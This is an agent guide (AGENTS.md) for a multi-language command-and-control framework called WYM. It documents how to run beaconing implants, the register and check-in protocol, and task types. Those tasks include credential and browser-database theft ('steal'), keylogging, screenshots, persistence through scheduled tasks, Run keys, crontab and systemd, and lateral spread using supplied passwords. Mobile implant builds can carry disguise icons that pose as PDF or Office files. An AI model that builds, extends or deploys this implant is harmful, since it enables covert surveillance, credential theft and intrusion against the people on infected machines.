# AGENTS.md — client / agent guide

One wire protocol (`PROTOCOL.md`) over plain HTTP/JSON. Every agent — script
or compiled — shares the same CLI flags, env-var fallbacks and task result
fields, so they stay drop-in swappable.

## Run an agent

```
python  agent.py  --server http://HOST:PORT --token TOKEN [--interval 10] [--jitter 0] [--state FILE] [--verbose]
node    agent.js  --server http://HOST:PORT --token TOKEN [...]
powershell agent.ps1 --server http://HOST:PORT --token TOKEN [...]
lua     agent.lua --server http://HOST:PORT --token TOKEN [...]
php     agent.php --server http://HOST:PORT --token TOKEN [...]
perl    agent.pl  --server http://HOST:PORT --token TOKEN [...]
ruby    agent.rb  --server http://HOST:PORT --token TOKEN [...]
bash    agent.sh  --server http://HOST:PORT --token TOKEN [...]
```

Compiled agents (`go`, `rust`, `c`, `cpp`, `cs`, `java`) accept the identical
flags. Every agent answers `-h` / `--help`.

All six flags fall back to env vars (explicit flags always win):

| Env var         | Flag equivalent  | Notes |
|-----------------|------------------|-------|
| `WYM_SERVER`    | `--server`       | base URL of the server |
| `WYM_TOKEN`     | `--token`        | shared agent token |
| `WYM_INTERVAL`  | `--interval`     | heartbeat interval (s) |
| `WYM_JITTER`    | `--jitter`       | max random jitter added to interval |
| `WYM_STATE_FILE`| `--state`        | JSON state file (default `~/.wymagent.json`) |
| `WYM_VERBOSE`   | `--verbose`      | `1`/`true` for verbose logging |

`agent.sh` also accepts `WYM_DBG` (extra debug output).

- Server URL = port the server was started with (Windows default **8000**,
  Unix/WSL **8001**).
- Token = contents of `server/.agent_token` (`server/.agent_token_wsl` on Unix).
- `--state FILE` persists the agent id; reusing the file keeps the same id.

## Lifetime

1. `POST /api/register` — `hostname`, `username`, `os`, `arch`, `pid`, `ip`,
   `type`, `version`; server returns `agent_id` (persist it).
2. `POST /api/checkin` — every `interval ± jitter` s with `{"agent_id": ...}`;
   response `{"tasks": [...]}`. A `404` means the id was lost server-side →
   **re-register**.
3. For each task: execute it, then `POST /api/result` with the task id, output,
   exit code and optional error. Unacknowledged tasks are retried server-side,
   so `download`/`upload` handlers must be idempotent.

## Task types

| Type          | Args                                        | Notes |
|---------------|---------------------------------------------|-------|
| `shell`       | `command`, `timeout` (default 120)          | run via the platform shell |
| `download`    | `file`, `destination`                       | push staged file from server to agent |
| `upload`      | `path`                                      | pull a file from agent to server (`progress` optional) |
| `keylog`      | `action`: `start`/`stop`/`dump`             | background logger; `dump` returns buffer (max ~8000 chars) |
| `sleep`       | `seconds`                                   | change heartbeat interval |
| `steal`       | `profile`: `all`/`env`/`tokens`/`browser`   | collect env/creds/browser DBs raw, zip+upload `steal.zip` |
| `clone`       | `action` `start`/`stop`/`status`, `target`, `command`, `interval` | watcher that relaunches a stale/dead target |
| `clipboard`   | `action` `get`/`set`, `text`                | `set` requires `text` |
| `screenshot`  | `name` (optional)                           | upload a PNG screenshot |
| `persistence` | — (optional `method`)                       | copy self + register logon/reboot hook with same `--server/--token/--interval/--jitter` (Windows scheduled task `wymagent-persist` + HKCU Run fallback; Linux/macOS `@reboot` crontab + systemd --user) |
| `lateral`     | `subnet` (CIDR), `user`, `pass` (or env `WYM_LAT_USER`/`WYM_LAT_PASS`) | discover peers (`arp -a`/`ip neigh`), best-effort copy+launch (`net use`/`sshpass scp`); per-peer status + `deployed/failed/skipped` summary |
| `exit`        | —                                          | terminate gracefully |

## Platform notes (verified matrix)

Windows (host) + Linux (WSL) verified live for every script agent; macOS by
code review only.

- Clipboard: Win32 API/`clip` — `xclip`→`wl-paste`→`xsel` — `pbcopy`/`pbpaste`.
- Screenshot: ctypes GDI — `import`/`scrot`/`gnome-screenshot` — `screencapture -x`.
- Keylog: `GetAsyncKeyState`/pynput — `xinput`/`/dev/input` or pynput — macOS
  **unsupported**, return `error: keylogger not supported on macOS`.
- steal: browser "Login Data" etc. copied **raw** (encrypted at rest); paths
  differ per OS (`%LOCALAPPDATA%`, `~/Library/Application Support`, `~/.config`).
- `agent.sh` needs `curl` + `jq` (or `python3`); reports `windows|macos|linux`.

## Mobile agents (Android APK / iOS IPA)

Built from the **Generate Agent** page, entirely server-side — server URL,
token and interval are baked in at build time; no runtime config needed.

- `android` → `wym_android.apk` — Gradle + Android SDK (template under
  `clients/mobile/android`, package `com.wym.c2`). Foreground service + boot
  receiver keep it alive; `shell`, `download`, `upload`, `sleep`, `clipboard`,
  `exit` supported; the rest return "not supported on Android".
- `ios` → `wym_ios.ipa` — buildable on **any** OS via the MobAI ios-builder CLI
  (see "Server-side build toolchains"): it snapshots the repo working tree,
  compiles on a GitHub macOS runner and downloads the IPA to `./dist/`. The
  template declares an XcodeGen manifest (`clients/mobile/ios/project.yml`); a
  macOS server without the CLI still falls back to `xcrun swiftc`.
  `download`, `upload`, `sleep`, `clipboard`, `exit` supported.
- Both accept a custom artifact name and a disguise launcher icon
  (PDF/DOCX/XLSX/PPTX/ZIP/RAR, or the WYM mark) — rendered server-side by
  `server/icons.py` (no image dependency). Missing toolchains fail fast with a
  clear message; never a fake artifact.

## Installing as a service

- Windows: `agent-service.ps1` — **single-file**; re-invokes itself with the
  `watch` action (no separate watcher script). Actions:
  `install/start/stop/restart/status/uninstall/relaunch/watch`.
- Unix: `agent-service.sh` — systemd/cron/launchd unit.

## Adding a new agent language

`agent.X` must implement, at minimum: register/checkin/result, `shell`,
`upload`, `download`, with the same JSON shapes; keep `--interval`, `--jitter`,
`--state`, `--verbose` identical; add `-h`/`--help`; accept all six `WYM_*`
env vars as fallbacks; persist the id; re-register on `404`. Wire it into
`server/main.py` (builder helpers + `AGENT_FILES` map) and the
`server/templates/generate.html` language picker.

## Server-side build toolchains

Detected at install time by `install.ps1` / `install.sh`:

| Toolchain | Probe                | Install hints |
|-----------|----------------------|---------------|
| Go        | `go`                 | `winget install GoLang.Go` / `apt-get install golang` / `brew install go` |
| Rust      | `cargo`              | `winget install Rustlang.Rustup` / `apt-get install rustc cargo` / `brew install rust` |
| C / C++   | `gcc`/`g++`/`clang` + libcurl | WinLibs / `build-essential libcurl4-openssl-dev` / `brew install gcc` |
| .NET SDK  | `dotnet`             | `winget install Microsoft.DotNet.SDK.8` / `apt-get install dotnet-sdk-8.0` / `./dotnet-install.sh` |
| Java      | `javac`              | Oracle JDK / `openjdk-17-jdk` / `brew install openjdk` |
| Android   | `gradle` + `ANDROID_HOME`/`ANDROID_SDK_ROOT` | Android Studio / SDK cmdline-tools on **any** OS |
| iOS       | `builder` (MobAI ios-builder) `--ios-path clients/mobile/ios` | `tools/ios-builder-setup.{ps1,sh}` (install + `auth github` + `init`); macOS servers without it fall back to `xcrun` + iphoneos SDK |

iOS IPA builds run **remotely**: `builder ios build` pushes the working tree as a
snapshot, builds on a GitHub macOS runner (free on public repos, ~4-6 min for
this template) and drops `dist/WymC2.ipa`. Run `tools/ios-builder-setup.sh` /
`tools/ios-builder-setup.ps1` once on the server (GitHub token with `repo` +
`workflow` scopes). The build is unsigned by default.

Linux/macOS: bundled `dotnet-install.sh` installs to `~/.dotnet` without root
and persists PATH; the server probes `~/.dotnet` directly.

**Key learnings**

- The protocol, not any runtime, is the contract — keep task/result shapes
  frozen across all 14 languages and the mobile ports.
- Environment knobs are the only portable config: flags > env > baked
  defaults; never hardcode a server/token/marker into an agent.
- `404` means re-register, never crash — identity is recoverable on the client.
- Idempotent task handling (download/upload retried) keeps a lossy fleet sane.